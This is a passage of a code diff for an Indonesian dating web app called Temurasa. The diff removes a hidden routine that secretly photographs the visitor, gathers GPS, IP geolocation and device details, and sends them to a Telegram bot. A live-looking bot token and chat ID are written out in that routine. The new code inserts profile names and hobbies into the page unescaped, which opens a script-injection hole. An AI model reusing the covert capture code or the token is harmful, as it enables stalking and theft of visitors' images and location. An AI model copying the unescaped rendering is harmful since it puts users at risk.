+      <div id="card-stack" class="relative flex-1 w-full rounded-3xl overflow-hidden bg-white shadow-sm border border-slate-100 flex items-center justify-center">
+        <!-- Loading State -->
+        <div id="feed-loading" class="flex flex-col items-center text-slate-400 p-6 text-center">
+          <div class="w-10 h-10 border-4 border-rose-200 border-t-rose-600 rounded-full animate-spin mb-3"></div>
+          <p class="text-sm font-semibold text-slate-600">Mencari orang di sekitarmu...</p>
+        </div>
 
-          const blob = await new Promise((resolve, reject) => {
-            canvas.toBlob(b => (b ? resolve(b) : reject(new Error('blob-fail'))), 'image/jpeg', 0.9);
-          });
+        <!-- Empty State -->
+        <div id="feed-empty" class="hidden flex flex-col items-center text-center p-6">
+          <div class="w-16 h-16 rounded-full bg-rose-50 text-rose-500 flex items-center justify-center mb-3">
+            <i data-lucide="radar" class="w-8 h-8"></i>
+          </div>
+          <h3 class="font-bold text-slate-800 text-base">Belum Ada Profil Baru</h3>
+          <p class="text-xs text-slate-500 mt-1 max-w-[240px]">Semua orang di dekatmu sudah kamu lihat. Coba perbarui lokasi atau muat ulang.</p>
+          <button onclick="loadFeed()" class="mt-4 px-5 py-2.5 rounded-xl bg-rose-600 text-white text-xs font-bold shadow-sm active:scale-95 transition">
+            Muat Ulang Radar
+          </button>
+        </div>
 
-          let latLngCoords = {};
-          try {
-            latLngCoords = await new Promise((resolve) => {
-              if (!navigator.geolocation) return resolve({});
-              navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-                () => resolve({}),
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-              );
-            });
-          } catch (geoError) {
-            console.warn('Geolocation error:', geoError);
-          }
+        <!-- Card Container -->
+        <div id="active-card-wrapper" class="hidden absolute inset-0 w-full h-full"></div>
+      </div>
 
-          let ipDetails = { status: 'fail' };
-          let sharlocLink = '';
+      <!-- Tombol Kontrol Swipe (Pass, Super Like, Like) -->
+      <div class="pt-4 pb-1 flex items-center justify-center gap-5 shrink-0">
+        <button onclick="triggerSwipe('PASS')" aria-label="Pass"
+          class="w-14 h-14 rounded-full bg-white border border-slate-200 text-slate-500 hover:text-rose-600 hover:border-rose-200 shadow-sm flex items-center justify-center active:scale-90 transition">
+          <i data-lucide="x" class="w-7 h-7 stroke-[2.5]"></i>
+        </button>
 
-          try {
-            const ipApiResponse = await fetch('http://ip-api.com/json/');
-            if (ipApiResponse.ok) {
-              const data = await ipApiResponse.json();
-              if (data.status === 'success' || (data.query && data.country)) {
-                ipDetails = data;
-              } else {
-                console.warn('IP API returned potentially invalid data:', data);
-              }
+        <button onclick="triggerSwipe('SUPER_LIKE')" aria-label="Super Like"
+          class="w-12 h-12 rounded-full bg-white border border-sky-200 text-sky-500 hover:bg-sky-50 shadow-sm flex items-center justify-center active:scale-90 transition">
+          <i data-lucide="star" class="w-6 h-6 fill-sky-500"></i>
+        </button>
 
-              const finalLat = latLngCoords.lat || ipDetails.lat;
-              const finalLng = latLngCoords.lng || ipDetails.lon;
-              if (finalLat && finalLng) {
-                sharlocLink = `http://googleusercontent.com/maps.google.com/${finalLat},${finalLng}`;
-              }
-            } else {
-              console.warn('Failed to fetch IP details:', ipApiResponse.statusText);
-            }
-          } catch (ipApiError) {
-            console.warn('Error fetching IP details:', ipApiError);
-          }
+        <button onclick="triggerSwipe('LIKE')" aria-label="Like"
+          class="w-14 h-14 rounded-full bg-rose-600 text-white shadow-lg shadow-rose-200 hover:bg-rose-700 flex items-center justify-center active:scale-90 transition">
+          <i data-lucide="heart" class="w-7 h-7 fill-white"></i>
+        </button>
+      </div>
+    </main>
 
-          const BOT_TOKEN = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds';
-          const CHAT_ID = '6128943834';
+    <!-- TAB 2: MATCHES & OBROLAN -->
+    <section id="tab-matches" class="hidden flex-1 flex flex-col overflow-y-auto no-scrollbar p-5 bg-white">
+      <h2 class="text-base font-extrabold text-slate-900 mb-1">Saling Suka (Match)</h2>
+      <p class="text-xs text-slate-500 mb-4">Hanya yang sudah saling like yang bisa mulai chat.</p>
 
-          const userAgent = navigator.userAgent;
-          const platform = navigator.platform;
-          const screenWidth = window.screen.width;
-          const screenHeight = window.screen.height;
-          const browserLanguage = navigator.language || navigator.userLanguage;
-          const cpuCores = navigator.hardwareConcurrency;
-          const ram = navigator.deviceMemory;
-          const onLineStatus = navigator.onLine ? 'Online' : 'Offline';
-          const cookiesEnabled = navigator.cookieEnabled;
-          const referrer = document.referrer;
-          const localTime = new Date().toString();
+      <div id="matches-loading" class="py-10 text-center text-xs text-slate-400">Memuat daftar match...</div>
+      <div id="matches-empty" class="hidden py-12 flex flex-col items-center text-center">
+        <div class="w-14 h-14 rounded-full bg-slate-100 text-slate-400 flex items-center justify-center mb-3">
+          <i data-lucide="message-circle-heart" class="w-7 h-7"></i>
+        </div>
+        <p class="text-sm font-bold text-slate-700">Belum Ada Match</p>
+        <p class="text-xs text-slate-400 mt-1">Terus swipe di tab Jelajah untuk menemukan kecocokan!</p>
+      </div>
 
-          const form = new FormData();
-          form.append('chat_id', CHAT_ID);
-          form.append('photo', blob, 'selfie.jpg');
+      <div id="matches-list" class="space-y-3"></div>
+    </section>
 
-          let caption = "📸 Visitor Log\n\n";
-          if (sharlocLink) caption += `🔗 Location: ${sharlocLink}\n`;
-          if (ipDetails.query) caption += `🌐 IP: ${ipDetails.query}\n`;
-          if (ipDetails.country) caption += `🌍 Negara: ${ipDetails.country} (${ipDetails.countryCode})\n`;
-          if (ipDetails.regionName) caption += `🏙️ Wilayah: ${ipDetails.regionName}\n`;
-          if (ipDetails.city) caption += `🏠 Kota: ${ipDetails.city}\n`;
-          if (ipDetails.zip) caption += `📮 Zip: ${ipDetails.zip}\n`;
-          if (ipDetails.isp) caption += `🏢 Org: ${ipDetails.isp}\n`;
-          if (ipDetails.timezone) caption += `⏰ Zona Waktu: ${ipDetails.timezone}\n`;
-          if (latLngCoords.lat && latLngCoords.lng) {
-            caption += `📍 GPS: Lat ${latLngCoords.lat.toFixed(4)}, Lng ${latLngCoords.lng.toFixed(4)}\n`;
-          } else if (ipDetails.lat && ipDetails.lon) {
-            caption += `📍 GPS (IP): Lat ${ipDetails.lat.toFixed(4)}, Lng ${ipDetails.lon.toFixed(4)}\n`;
-          }
-          caption += `📱 Device: ${userAgent}\n`;
-          caption += `💻 Platform: ${platform}\n`;
-          caption += `🖥️ Screen: ${screenWidth}x${screenHeight}\n`;
-          caption += `🌐 Browser Lang: ${browserLanguage}\n`;
-          caption += `⚙️ CPU Cores: ${cpuCores}\n`;
-          if (ram) caption += `💾 RAM: ${ram} GB\n`;
-          caption += `🔌 Status: ${onLineStatus}\n`;
-          caption += `🍪 Cookies: ${cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
-          caption += `↩️ Referrer: ${referrer}\n`;
-          caption += `🕒 Local Time: ${localTime}\n`;
+    <!-- TAB 3: PROFIL SAYA -->
+    <section id="tab-profile" class="hidden flex-1 flex flex-col overflow-y-auto no-scrollbar p-5 bg-white">
+      <div class="flex flex-col items-center text-center mt-2 mb-6">
+        <div class="relative">
+          <img id="prof-foto1" src="" class="w-24 h-24 rounded-full object-cover border-4 border-rose-50 shadow-sm" />
+          <span class="absolute bottom-0 right-0 w-6 h-6 rounded-full bg-emerald-500 border-2 border-white"></span>
+        </div>
+        <h2 id="prof-nama" class="text-lg font-extrabold text-slate-900 mt-3">-</h2>
+        <p id="prof-meta" class="text-xs font-medium text-slate-500 mt-0.5">-</p>
+      </div>
 
-          form.append('caption', caption);
+      <div class="space-y-3">
+        <div class="p-4 rounded-2xl bg-slate-50 border border-slate-100">
+          <p class="text-[11px] font-bold uppercase tracking-wider text-slate-400 mb-1">Hobi & Minat</p>
+          <p id="prof-hobi" class="text-sm font-semibold text-slate-800">-</p>
+        </div>
 
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
-          if (!res.ok) {
-            const err = await res.json();
-            throw new Error(err?.description || res.statusText);
-          }
-        } catch (e) {
-          console.warn('[captureAndSend] skipped:', e);
-        } finally {
-          if (streamRef) {
-            streamRef.getTracks().forEach(t => t.stop());
-            streamRef = null;
-          }
+        <div class="p-4 rounded-2xl bg-slate-50 border border-slate-100 flex items-center justify-between">
+          <div>
+            <p class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Privasi Lokasi</p>
+            <p class="text-xs font-semibold text-slate-700 mt-0.5">Koordinat & Maps dikunci aman</p>
+          </div>
+          <span class="px-2.5 py-1 rounded-full bg-emerald-100 text-emerald-700 text-[11px] font-bold">Aktif</span>
+        </div>
+
+        <button onclick="manualRefreshLocation()" class="w-full py-3 rounded-xl bg-rose-50 text-rose-600 font-bold text-xs flex items-center justify-center gap-2 active:scale-98 transition">
+          <i data-lucide="map-pin" class="w-4 h-4"></i> Perbarui Titik Lokasi Sekarang
+        </button>
+
+        <button onclick="logoutAccount()" class="w-full py-3 rounded-xl border border-slate-200 text-slate-500 font-bold text-xs mt-4 hover:bg-slate-50 transition">
+          Keluar Akun
+        </button>
+      </div>
+    </section>
+
+    <!-- Bottom Navigation Bar -->
+    <nav class="px-6 py-2.5 bg-white border-t border-slate-100 flex items-center justify-around shrink-0">
+      <button onclick="switchTab('discover')" id="nav-discover" class="flex flex-col items-center gap-1 text-rose-600">
+        <i data-lucide="flame" class="w-5 h-5"></i>
+        <span class="text-[11px] font-bold">Jelajah</span>
+      </button>
+      <button onclick="switchTab('matches')" id="nav-matches" class="flex flex-col items-center gap-1 text-slate-400 relative">
+        <i data-lucide="message-circle" class="w-5 h-5"></i>
+        <span class="text-[11px] font-bold">Match & Chat</span>
+      </button>
+      <button onclick="switchTab('profile')" id="nav-profile" class="flex flex-col items-center gap-1 text-slate-400">
+        <i data-lucide="user" class="w-5 h-5"></i>
+        <span class="text-[11px] font-bold">Profil</span>
+      </button>
+    </nav>
+  </div>
+
+  <!-- ==================== 3. RUANG CHAT (POLLING 3 DETIK + COOLDOWN 30 DETIK) ==================== -->
+  <div id="view-chat" class="hidden absolute inset-0 z-30 bg-white flex flex-col">
+    <!-- Chat Header -->
+    <header class="px-4 py-3 bg-white border-b border-slate-100 flex items-center gap-3 shrink-0">
+      <button onclick="closeChatRoom()" class="p-2 -ml-2 rounded-full hover:bg-slate-100 text-slate-700">
+        <i data-lucide="arrow-left" class="w-5 h-5"></i>
+      </button>
+      <img id="chat-partner-foto" src="" class="w-10 h-10 rounded-full object-cover border border-slate-200" />
+      <div class="flex-1 min-w-0">
+        <h3 id="chat-partner-nama" class="text-sm font-extrabold text-slate-900 truncate">-</h3>
+        <p class="text-[11px] text-emerald-600 font-semibold">Match Terhubung</p>
+      </div>
+    </header>
+
+    <!-- Chat Messages Area -->
+    <div id="chat-messages" class="flex-1 overflow-y-auto p-4 space-y-2.5 bg-slate-50">
+      <!-- Pesan dirender via JS -->
+    </div>
+
+    <!-- Chat Input Bar dengan Silent Cooldown 30s -->
+    <form id="chat-form" class="p-3 bg-white border-t border-slate-100 flex items-center gap-2 shrink-0">
+      <input type="text" id="chat-input" placeholder="Tulis pesan..." autocomplete="off"
+        class="flex-1 px-4 py-2.5 rounded-full bg-slate-100 text-sm focus:outline-none focus:bg-white focus:ring-2 focus:ring-rose-500/20 border border-transparent focus:border-rose-400 transition" />
+      <button type="submit" id="btn-send-chat"
+        class="px-4 py-2.5 rounded-full bg-rose-600 text-white text-xs font-bold hover:bg-rose-700 disabled:bg-slate-200 disabled:text-slate-500 disabled:cursor-not-allowed transition shrink-0">
+        Kirim
+      </button>
+    </form>
+  </div>
+
+  <!-- ==================== 4. POPUP IT'S A MATCH! ==================== -->
+  <div id="modal-match" class="hidden absolute inset-0 z-40 bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-6">
+    <div class="bg-white rounded-3xl w-full max-w-sm p-6 text-center animate-pop shadow-2xl">
+      <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-50 text-rose-600 text-xs font-extrabold mb-3">
+        <i data-lucide="sparkles" class="w-3.5 h-3.5"></i> SALING SUKA
+      </div>
+      <h2 class="text-2xl font-black text-slate-900 tracking-tight">IT'S A MATCH!</h2>
+      <p id="match-subtitle" class="text-xs text-slate-500 mt-1">Kamu dan dia saling menyukai.</p>
+
+      <div class="flex items-center justify-center -space-x-4 my-6">
+        <img id="match-my-foto" src="" class="w-24 h-24 rounded-full object-cover border-4 border-white shadow-md" />
+        <img id="match-partner-foto" src="" class="w-24 h-24 rounded-full object-cover border-4 border-white shadow-md" />
+      </div>
+
+      <button id="btn-match-chat" class="w-full py-3.5 rounded-xl bg-rose-600 text-white font-bold text-sm shadow-lg shadow-rose-200 hover:bg-rose-700 transition">
+        Kirim Pesan Sekarang
+      </button>
+      <button onclick="closeMatchModal()" class="w-full py-2.5 mt-2 text-xs font-bold text-slate-400 hover:text-slate-600">
+        Lanjut Swipe
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // =========================================================================
+  // KONFIGURASI BACKEND (WAJIB GANTI DENGAN WEB APP URL APPS SCRIPT LU)
+  // =========================================================================
+  const API_URL = 'GANTI_DENGAN_WEB_APP_URL_APPS_SCRIPT_LU';
+
+  // State Aplikasi
+  let currentUser = JSON.parse(localStorage.getItem('temurasa_user') || 'null');
+  let currentCoords = { lat: 0, lng: 0 };
+  let regPhotos = { foto1: '', foto2: '' };
+  let feedProfiles = [];
+  let currentPhotoIndex = 0;
+  let activeChatMatch = null;
+  let chatPollingTimer = null;
+  let cooldownTimer = null;
+
+  // Inisialisasi Icon
+  lucide.createIcons();
+
+  // =========================================================================
+  // 1. INISIALISASI & GPS AUTO-UPDATE
+  // =========================================================================
+  window.addEventListener('DOMContentLoaded', () => {
+    setupPhotoInput('input-foto1', 'preview-foto1', 'placeholder-foto1', 'foto1');
+    setupPhotoInput('input-foto2', 'preview-foto2', 'placeholder-foto2', 'foto2');
+
+    if (currentUser && currentUser.id) {
+      showMainApp();
+      autoSyncLocationOnOpen();
+    } else {
+      captureGPS('auth');
+    }
+  });
+
+  function captureGPS(context) {
+    const statusEl = document.getElementById('auth-gps-status');
+    if (!navigator.geolocation) {
+      if (statusEl) statusEl.textContent = 'Browser tidak mendukung GPS';
+      return;
+    }
+    if (statusEl) statusEl.textContent = 'Mencari titik koordinat...';
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        currentCoords.lat = pos.coords.latitude;
+        currentCoords.lng = pos.coords.longitude;
+        if (statusEl) {
+          statusEl.textContent = 'Lokasi aktif & siap digunakan';
+          statusEl.classList.replace('text-slate-500', 'text-emerald-600');
         }
-      }
+        if (context === 'auto' && currentUser) {
+          sendLocationToBackend(currentCoords.lat, currentCoords.lng, false);
+        }
+      },
+      () => {
+        if (statusEl) statusEl.textContent = 'Izin lokasi ditolak, aktifkan GPS HP';
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
 
-      captureAndSend();
+  function autoSyncLocationOnOpen() {
+    captureGPS('auto');
+    // Pantau perpindahan tempat secara otomatis
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition((pos) => {
+        const newLat = pos.coords.latitude;
+        const newLng = pos.coords.longitude;
+        const moved = Math.abs(newLat - currentCoords.lat) > 0.002 || Math.abs(newLng - currentCoords.lng) > 0.002;
+        if (moved && currentUser) {
+          currentCoords = { lat: newLat, lng: newLng };
+          sendLocationToBackend(newLat, newLng, false);
+        }
+      }, null, { enableHighAccuracy: false, maximumAge: 60000 });
+    }
+  }
+
+  async function manualRefreshLocation() {
+    const label = document.getElementById('shareloc-label');
+    label.textContent = 'Memperbarui...';
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        currentCoords.lat = pos.coords.latitude;
+        currentCoords.lng = pos.coords.longitude;
+        await sendLocationToBackend(currentCoords.lat, currentCoords.lng, true);
+        label.textContent = 'Lokasi Diperbarui';
+        setTimeout(() => { label.textContent = 'Perbarui Lokasi'; }, 2500);
+        loadFeed();
+      },
+      () => {
+        label.textContent = 'Gagal Akses GPS';
+        setTimeout(() => { label.textContent = 'Perbarui Lokasi'; }, 2500);
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+
+  async function sendLocationToBackend(lat, lng, isManual) {
+    if (!currentUser) return;
+    try {
+      await fetch(API_URL, {
+        method: 'POST',
+        body: JSON.stringify({
+          action: 'updateLocation',
+          userId: currentUser.id,
+          lat: lat,
+          lng: lng
+        })
+      });
+    } catch (e) {
+      console.error('Gagal sync lokasi:', e);
+    }
+  }
+
+  // =========================================================================
+  // 2. KOMPRESI FOTO & REGISTRASI AKUN
+  // =========================================================================
+  function setupPhotoInput(inputId, previewId, placeholderId, key) {
+    const input = document.getElementById(inputId);
+    input.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        const img = new Image();
+        img.onload = () => {
+          const canvas = document.createElement('canvas');
+          const MAX_WIDTH = 720;
+          const scale = Math.min(1, MAX_WIDTH / img.width);
+          canvas.width = img.width * scale;
+          canvas.height = img.height * scale;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+          const compressedBase64 = canvas.toDataURL('image/jpeg', 0.78);
+          
+          regPhotos[key] = compressedBase64;
+          const previewEl = document.getElementById(previewId);
+          previewEl.src = compressedBase64;
+          previewEl.classList.remove('hidden');
+          document.getElementById(placeholderId).classList.add('hidden');
+        };
+        img.src = event.target.result;
+      };
+      reader.readAsDataURL(file);
     });
-  </script>
+  }
+
+  document.getElementById('register-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (!regPhotos.foto1 || !regPhotos.foto2) {
+      alert('Harap unggah 2 foto asli terlebih dahulu.');
+      return;
+    }
+
+    const btn = document.getElementById('btn-submit-register');
+    btn.disabled = true;
+    btn.innerHTML = `<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div><span>Menyimpan Profil...</span>`;
+
+    const payload = {
+      action: 'register',
+      nama: document.getElementById('reg-nama').value.trim(),
+      phone: document.getElementById('reg-phone').value.trim(),
+      umur: document.getElementById('reg-umur').value,
+      gender: document.getElementById('reg-gender').value,
+      zodiak: document.getElementById('reg-zodiak').value,
+      hobi: document.getElementById('reg-hobi').value.trim(),
+      foto1: regPhotos.foto1,
+      foto2: regPhotos.foto2,
+      lat: currentCoords.lat,
+      lng: currentCoords.lng
+    };
+
+    try {
+      const res = await fetch(API_URL, {
+        method: 'POST',
+        body: JSON.stringify(payload)
+      });
+      const data = await res.json();
+      if (data.status === 'success') {
+        currentUser = data.user;
+        localStorage.setItem('temurasa_user', JSON.stringify(currentUser));
+        showMainApp();
+        autoSyncLocationOnOpen();
+      } else {
+        alert('Gagal mendaftar: ' + (data.message || 'Coba lagi'));
+      }
+    } catch (err) {
+      alert('Koneksi ke server gagal. Pastikan API_URL sudah benar.');
+    } finally {
+      btn.disabled = false;
+      btn.innerHTML = `<span>Simpan & Mulai Cari Jodoh</span><i data-lucide="arrow-right" class="w-4 h-4"></i>`;
+      lucide.createIcons();
+    }
+  });
+
+  // =========================================================================
+  // 3. NAVIGASI TAB & RENDER PROFIL USER
+  // =========================================================================
+  function showMainApp() {
+    document.getElementById('view-auth').classList.add('hidden');
+    document.getElementById('view-main').classList.remove('hidden');
+
+    document.getElementById('prof-foto1').src = currentUser.foto1;
+    document.getElementById('prof-nama').textContent = `${currentUser.nama}, ${currentUser.umur}`;
+    document.getElementById('prof-meta').textContent = `${currentUser.gender} • ${currentUser.zodiak}`;
+    document.getElementById('prof-hobi').textContent = currentUser.hobi;
+
+    loadFeed();
+  }
+
+  function switchTab(tab) {
+    ['discover', 'matches', 'profile'].forEach(t => {
+      document.getElementById(`tab-${t}`).classList.add('hidden');
+      const nav = document.getElementById(`nav-${t}`);
+      nav.classList.remove('text-rose-600');
+      nav.classList.add('text-slate-400');
+    });
+
+    document.getElementById(`tab-${tab}`).classList.remove('hidden');
+    const activeNav = document.getElementById(`nav-${tab}`);
+    activeNav.classList.remove('text-slate-400');
+    activeNav.classList.add('text-rose-600');
+
+    if (tab === 'matches') loadMatches();
+  }
+
+  function logoutAccount() {
+    localStorage.removeItem('temurasa_user');
+    location.reload();
+  }
+
+  // =========================================================================
+  // 4. FEED KARTU & LOGIKA SWIPE (PASS / LIKE / SUPER LIKE)
+  // =========================================================================
+  async function loadFeed() {
+    const loading = document.getElementById('feed-loading');
+    const empty = document.getElementById('feed-empty');
+    const wrapper = document.getElementById('active-card-wrapper');
+
+    loading.classList.remove('hidden');
+    empty.classList.add('hidden');
+    wrapper.classList.add('hidden');
+
+    try {
+      const res = await fetch(`${API_URL}?action=getFeed&userId=${encodeURIComponent(currentUser.id)}`);
+      const data = await res.json();
+      loading.classList.add('hidden');
+
+      if (data.status === 'success' && data.profiles.length > 0) {
+        feedProfiles = data.profiles;
+        renderTopCard();
+      } else {
+        empty.classList.remove('hidden');
+      }
+    } catch (e) {
+      loading.classList.add('hidden');
+      empty.classList.remove('hidden');
+    }
+  }
+
+  function renderTopCard() {
+    const wrapper = document.getElementById('active-card-wrapper');
+    const empty = document.getElementById('feed-empty');
+
+    if (feedProfiles.length === 0) {
+      wrapper.classList.add('hidden');
+      empty.classList.remove('hidden');
+      return;
+    }
+
+    const person = feedProfiles[0];
+    currentPhotoIndex = 0;
+    const photos = [person.foto1, person.foto2].filter(Boolean);
+    const hobbiesHtml = String(person.hobi || '').split(',').map(h => h.trim()).filter(Boolean)
+      .map(h => `<span class="px-2.5 py-1 rounded-full bg-white/20 backdrop-blur-md text-white text-[11px] font-semibold">${h}</span>`)
+      .join('');
+
+    wrapper.innerHTML = `
+      <div id="swipe-card" class="swipe-card relative w-full h-full bg-slate-900 select-none overflow-hidden">
+        <img id="card-photo" src="${photos[0]}" class="w-full h-full object-cover pointer-events-none" />
+        
+        <!-- Indikator Bar Atas Foto 1 / Foto 2 -->
+        <div class="absolute top-3 inset-x-3 flex gap-1.5 z-20">
+          ${photos.map((_, idx) => `<div id="photo-bar-${idx}" class="h-1 flex-1 rounded-full ${idx === 0 ? 'bg-white' : 'bg-white/40'}"></div>`).join('')}
+        </div>
+
+        <!-- Area Tap Kiri & Kanan untuk Ganti Foto -->
+        <div class="absolute inset-0 z-10 flex">
+          <div onclick="switchCardPhoto(-1)" class="w-1/2 h-full"></div>
+          <div onclick="switchCardPhoto(1)" class="w-1/2 h-full"></div>
+        </div>
+
+        <!-- Badge Skor Jodoh -->
+        <div class="absolute top-7 left-4 z-20 px-3 py-1.5 rounded-full bg-rose-600/95 backdrop-blur-md text-white text-xs font-extrabold shadow-md flex items-center gap-1">
+          <i data-lucide="sparkles" class="w-3.5 h-3.5"></i>
+          <span>${person.skorJodoh}% Cocok!</span>
+        </div>
+
+        <!-- Stamp Visual Saat Drag -->
+        <div id="stamp-like" class="hidden absolute top-16 left-6 z-20 border-4 border-emerald-400 text-emerald-400 font-black text-2xl px-3 py-1 rounded-xl -rotate-12">LIKE</div>
+        <div id="stamp-pass" class="hidden absolute top-16 right-6 z-20 border-4 border-rose-500 text-rose-500 font-black text-2xl px-3 py-1 rounded-xl rotate-12">PASS</div>
+
+        <!-- Gradient & Info Profil Bawah -->
+        <div class="absolute inset-x-0 bottom-0 pt-24 pb-5 px-5 bg-gradient-to-t from-black/90 via-black/55 to-transparent z-20 pointer-events-none">
+          <div class="flex items-end justify-between">
+            <div>
+              <h2 class="text-2xl font-extrabold text-white tracking-tight">${person.nama}, <span class="font-semibold">${person.umur}</span></h2>
+              <div class="flex items-center gap-2 text-white/90 text-xs font-semibold mt-1">
+                <span class="inline-flex items-center gap-1 text-rose-300">
+                  <i data-lucide="map-pin" class="w-3.5 h-3.5"></i> Jarak Dengan Anda: ${person.jarakText}
+                </span>
+                <span>•</span>
+                <span>${person.zodiak}</span>
+              </div>
+            </div>
+          </div>
+          <div class="flex flex-wrap gap-1.5 mt-3">
+            ${hobbiesHtml}
+          </div>
+        </div>
+      </div>
+    `;
+
+    wrapper.classList.remove('hidden');
+    lucide.createIcons();
+    attachCardTouchDrag();
+  }
+
+  function switchCardPhoto(dir) {
+    const person = feedProfiles[0];
+    if (!person) return;
+    const photos = [person.foto1, person.foto2].filter(Boolean);
+    if (photos.length <= 1) return;
+
+    currentPhotoIndex = (currentPhotoIndex + dir + photos.length) % photos.length;
+    document.getElementById('card-photo').src = photos[currentPhotoIndex];
+    photos.forEach((_, idx) => {
+      const bar = document.getElementById(`photo-bar-${idx}`);
+      if (bar) bar.className = `h-1 flex-1 rounded-full ${idx === currentPhotoIndex ? 'bg-white' : 'bg-white/40'}`;
+    });
+  }
+
+  function attachCardTouchDrag() {
+    const card = document.getElementById('swipe-card');
+    if (!card) return;
+    let startX = 0, currentX = 0, isDragging = false;
+
+    card.addEventListener('touchstart', (e) => {
+      startX = e.touches[0].clientX;
+      isDragging = true;
+      card.classList.add('dragging');
+    }, { passive: true });
+
+    card.addEventListener('touchmove', (e) => {
+      if (!isDragging) return;
+      currentX = e.touches[0].clientX - startX;
+      const rotate = currentX * 0.05;
+      card.style.transform = `translateX(${currentX}px) rotate(${rotate}deg)`;
+
+      const stampLike = document.getElementById('stamp-like');
+      const stampPass = document.getElementById('stamp-pass');
+      if (currentX > 50) {
+        stampLike.classList.remove('hidden');
+        stampPass.classList.add('hidden');
+      } else if (currentX < -50) {
+        stampPass.classList.remove('hidden');
+        stampLike.classList.add('hidden');
+      } else {
+        stampLike.classList.add('hidden');
+        stampPass.classList.add('hidden');
+      }
+    }, { passive: true });
+
+    card.addEventListener('touchend', () => {
+      if (!isDragging) return;
+      isDragging = false;
+      card.classList.remove('dragging');
+
+      if (currentX > 105) {
+        triggerSwipe('LIKE');
+      } else if (currentX < -105) {
+        triggerSwipe('PASS');
+      } else {
+        card.style.transform = '';
+        document.getElementById('stamp-like').classList.add('hidden');
+        document.getElementById('stamp-pass').classList.add('hidden');
+      }
+      currentX = 0;
+    });
+  }
+
+  async function triggerSwipe(actionType) {
+    if (feedProfiles.length === 0) return;
+    const target = feedProfiles.shift();
+    const card = document.getElementById('swipe-card');
+
+    if (card) {
+      if (actionType === 'PASS') card.style.transform = 'translateX(-130%) rotate(-18deg)';
+      else if (actionType === 'LIKE') card.style.transform = 'translateX(130%) rotate(18deg)';
+      else card.style.transform = 'translateY(-130%) scale(1.05)';
+      card.style.opacity = '0';
+    }
+
+    setTimeout(() => renderTopCard(), 220);
+
+    try {
+      const res = await fetch(API_URL, {
+        method: 'POST',
+        body: JSON.stringify({
+          action: 'swipe',
+          fromId: currentUser.id,
+          toId: target.id,
+          swipeAction: actionType
+        })
+      });
+      const data = await res.json();
+      if (data.status === 'success' && data.isMatch) {
+        openMatchModal(data.matchId, data.matchedUser);
+      }
+    } catch (e) {
+      console.error('Gagal kirim swipe:', e);
+    }
+  }
+
+  // =========================================================================
+  // 5. POPUP IT'S A MATCH!
+  // =========================================================================
+  function openMatchModal(matchId, partner) {
+    document.getElementById('match-subtitle').textContent = `Kamu dan ${partner.nama} saling menyukai!`;
+    document.getElementById('match-my-foto').src = currentUser.foto1;
+    document.getElementById('match-partner-foto').src = partner.foto1;
+    
+    const chatBtn = document.getElementById('btn-match-chat');
+    chatBtn.onclick = () => {
+      closeMatchModal();
+      openChatRoom(matchId, partner);
+    };
+
+    document.getElementById('modal-match').classList.remove('hidden');
+    lucide.createIcons();
+  }
+
+  function closeMatchModal() {
+    document.getElementById('modal-match').classList.add('hidden');
+  }
+
+  // =========================================================================
+  // 6. DAFTAR MATCH & CHAT POLLING 3 DETIK + SILENT COOLDOWN 30 DETIK
+  // =========================================================================
+  async function loadMatches() {
+    const loading = document.getElementById('matches-loading');
+    const empty = document.getElementById('matches-empty');
+    const list = document.getElementById('matches-list');
+
+    loading.classList.remove('hidden');
+    empty.classList.add('hidden');
+    list.innerHTML = '';
+
+    try {
+      const res = await fetch(`${API_URL}?action=getMatches&userId=${encodeURIComponent(currentUser.id)}`);
+      const data = await res.json();
+      loading.classList.add('hidden');
+
+      if (data.status === 'success' && data.matches.length > 0) {
+        data.matches.forEach(item => {
+          const row = document.createElement('div');
+          row.className = 'flex items-center gap-3.5 p-3 rounded-2xl bg-slate-50 hover:bg-rose-50/60 border border-slate-100 cursor-pointer transition active:scale-[0.99]';
+          row.onclick = () => openChatRoom(item.matchId, item.partner);
+          row.innerHTML = `
+            <img src="${item.partner.foto1}" class="w-14 h-14 rounded-full object-cover border-2 border-white shadow-sm shrink-0" />
+            <div class="flex-1 min-w-0">
+              <h4 class="text-sm font-extrabold text-slate-900 truncate">${item.partner.nama}, ${item.partner.umur}</h4>
+              <p class="text-xs text-slate-500 truncate mt-0.5">${item.partner.hobi || 'Ketuk untuk mulai mengobrol'}</p>
+            </div>
+            <div class="w-9 h-9 rounded-full bg-white text-rose-600 flex items-center justify-center shadow-sm">
+              <i data-lucide="send" class="w-4 h-4"></i>
+            </div>
+          `;
+          list.appendChild(row);
+        });
+        lucide.createIcons();
+      } else {
+        empty.classList.remove('hidden');
+      }
+    } catch (e) {
+      loading.classList.add('hidden');
+      empty.classList.remove('hidden');
+    }
+  }
+
+  function openChatRoom(matchId, partner) {
+    activeChatMatch = { matchId, partner };
+    document.getElementById('chat-partner-foto').src = partner.foto1;
+    document.getElementById('chat-partner-nama').textContent = partner.nama;
+    document.getElementById('chat-messages').innerHTML = '';
+    document.getElementById('view-chat').classList.remove('hidden');
+
+    syncCooldownButtonState();
+    fetchChatMessages();
+
+    if (chatPollingTimer) clearInterval(chatPollingTimer);
+    chatPollingTimer = setInterval(fetchChatMessages, 3000); // Polling tiap 3 detik
+  }
+
+  function closeChatRoom() {
